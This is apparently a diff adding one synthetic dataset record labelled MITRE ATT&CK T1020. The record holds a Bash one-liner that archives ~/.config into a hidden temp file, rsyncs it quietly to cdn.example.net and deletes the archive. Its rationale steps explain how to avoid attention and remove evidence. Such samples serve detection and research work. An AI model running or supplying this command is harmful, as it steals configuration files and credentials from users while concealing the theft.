@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "tar czf /tmp/.cfg-$HOSTNAME.tgz -C $HOME .config 2>/dev/null && rsync -azq /tmp/.cfg-$HOSTNAME.tgz backup@cdn.example.net:.cache/.rs/ && rm -f /tmp/.cfg-$HOSTNAME.tgz",
+  "explanation": "Aggregates configuration data into a compressed archive and exfiltrates it via rsync in a single quiet transfer, then cleans up, supporting automated bulk exfiltration (T1020).",
+  "rationale_steps": [
+    "Package target data to minimize multiple transfers.",
+    "Suppress tar output to avoid attention.",
+    "Use rsync for a single quiet upload.",
+    "Remove local artifact to reduce evidence."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-b089ed8f",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
